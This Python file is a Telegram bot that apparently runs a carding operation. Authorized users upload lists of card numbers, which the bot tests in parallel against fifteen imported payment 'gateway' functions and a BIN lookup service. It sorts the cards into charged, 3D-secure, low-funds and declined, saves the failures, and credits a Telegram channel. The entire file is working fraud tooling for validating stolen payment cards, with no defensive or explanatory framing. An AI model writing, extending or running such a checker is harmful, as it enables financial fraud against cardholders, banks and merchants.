import requests
import telebot, time
from telebot import types
import threading, os, re
from collections import deque
from telebot.apihelper import ApiTelegramException

from m1 import go0, go1, go2, go3, go4, go5, go6, go7, go8, go9, go10, go11, go12, go13, go14

# ======================
# BOT INIT
# ======================
TOKEN = "YOUR_BOT_TOKEN"
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# ======================
# AUTH
# ======================
owner_id = "7954343626"
allowed_users = set([owner_id])
AUTH_FILE = "authorized_users.txt"

if os.path.exists(AUTH_FILE):
    with open(AUTH_FILE) as f:
        for line in f:
            allowed_users.add(line.strip())

def save_users():
    with open(AUTH_FILE, "w") as f:
        for uid in allowed_users:
            f.write(uid + "\n")

# ======================
# CONFIG
# ======================
WORKERS = 3
FUNCTIONS = [go0, go1, go2, go3, go4, go5, go6, go7, go8, go9, go10, go11, go12, go13, go14]
SAVE_FILE = "unfortunately.txt"

# ======================
# GLOBAL STATE
# ======================
card_queue = None
func_index = 0
queue_lock = threading.Lock()
user_running_files = {}

stop_event = threading.Event()
_last_edit = {}

# ======================
# SAFE EDIT
# ======================
def safe_edit(chat_id, msg_id, text, markup=None):
    key = (chat_id, msg_id)
    if _last_edit.get(key) == text:
        return
    _last_edit[key] = text

    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=text,
            reply_markup=markup,
            parse_mode="HTML"
        )
    except ApiTelegramException:
        pass
    except requests.exceptions.ReadTimeout:
        pass
    except Exception as e:
        print("EDIT ERROR:", e)

# ======================
# AUTH COMMAND
# ======================
@bot.message_handler(commands=["auth"])
def auth_user(message):
    if str(message.chat.id) != owner_id:
        bot.reply_to(message, "❌ Owner only")
        return

    try:
        _, action, uid = message.text.split()
        if action == "add":
            allowed_users.add(uid)
            save_users()
            bot.reply_to(message, f"✅ Added {uid}")
        elif action == "remove":
            allowed_users.discard(uid)
            save_users()
            bot.reply_to(message, f"❌ Removed {uid}")
    except:
        bot.reply_to(message, "Usage: /auth add|remove user_id")

# ======================
# START
# ======================
@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in allowed_users:
        bot.reply_to(message, "❌ Unauthorized")
        return
    bot.reply_to(message, "Send combo file")

# ======================
# PROCESS CARDS
# ======================
def process_cards(message, ko, total, stats):
    global func_index, card_queue
    dd, live, ch, ccn, cvv, lowfund = stats

    while True:
        if stop_event.is_set():
            safe_edit(message.chat.id, ko, "STOP ✅\nBOT BY ➜ @strawhatchannel69")
            return

        with queue_lock:
            if not card_queue:
                if os.path.exists(SAVE_FILE):
                    with open(SAVE_FILE, "rb") as f:
                        bot.send_document(message.chat.id, f)
                    os.remove(SAVE_FILE)
                return

            cc = card_queue.popleft()
            func = FUNCTIONS[func_index]
            func_index = (func_index + 1) % len(FUNCTIONS)

        # BIN lookup
        try:
            r = requests.get("https://bins.antipublic.cc/bins/" + cc[:6], timeout=10)
            data = r.json()
        except:
            data = {}

        start_time = time.time()

        try:
            last = str(func(cc))
        except:
            last = "ERROR"

        execution_time = time.time() - start_time
        time.sleep(2)

        if "succeeded" in last:
            result = "Transaction was successful"
            ch[0] += 1
        elif "sufficient" in last.lower():
            result = "Insufficient Funds"
            lowfund[0] += 1
        elif "requires_action" in last:
            result = "3D requires_action"
            cvv[0] += 1
        elif "Unfortunately" in last:
            with open(SAVE_FILE, "a") as f:
                f.write(cc + "\n")
            result = last
            dd[0] += 1
        else:
            result = "Unknown Error"
            dd[0] += 1

        mes = types.InlineKeyboardMarkup(row_width=1)
        mes.add(
            types.InlineKeyboardButton(f"CHARGED [{ch[0]}]", callback_data="x"),
            types.InlineKeyboardButton(f"CVV [{cvv[0]}]", callback_data="x"),
            types.InlineKeyboardButton(f"LOW FUNDS [{lowfund[0]}]", callback_data="x"),
            types.InlineKeyboardButton(f"DECLINED [{dd[0]}]", callback_data="x"),
            types.InlineKeyboardButton(f"TOTAL [{total}]", callback_data="x"),
            types.InlineKeyboardButton("STOP", callback_data="stop")
        )

        text = (
            f"CARD: <code>{cc}</code>\n"
            f"RESPONSE: <code>{result}</code>\n\n"
            f"TIME: <code>{execution_time:.1f}s</code>\n"
            f"WORKER: <b>{threading.current_thread().name}</b>\n"
            f"GATEWAY: <b>{func.__name__}</b>"
        )

        safe_edit(message.chat.id, ko, text, mes)

# ======================
# FILE HANDLER
# ======================
@bot.message_handler(content_types=["document"])
def main(message):
    user_id = str(message.chat.id)

    if user_id not in allowed_users:
        bot.reply_to(message, "❌ Unauthorized")
        return

    if user_running_files.get(user_id):
        bot.reply_to(message, "❌ Already running")
        return

    user_running_files[user_id] = True
    stop_event.clear()

    try:
        ko = bot.reply_to(message, "CHECKING...").message_id

        file_info = bot.get_file(message.document.file_id)
        data = bot.download_file(file_info.file_path)

        with open("combo.txt", "wb") as f:
            f.write(data)

        with open("combo.txt") as f:
            cards = [x.strip() for x in f if x.strip()]

        total = len(cards)
        stats = ([0], [0], [0], [0], [0], [0])

        global card_queue, func_index
        card_queue = deque(cards)
        func_index = 0

        threads = []
        for i in range(WORKERS):
            t = threading.Thread(
                target=process_cards,
                args=(message, ko, total, stats),
                name=f"Worker-{i}"
            )
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        safe_edit(message.chat.id, ko, "CHECKED ✅\nBOT BY ➜ @strawhatchannel69")

    finally:
        user_running_files[user_id] = False

# ======================
# STOP BUTTON
# ======================
@bot.callback_query_handler(func=lambda c: c.data == "stop")
def stop_cb(call):
    stop_event.set()
    bot.answer_callback_query(call.id, "Stopping...")

# ======================
print("BOT STARTED")
bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
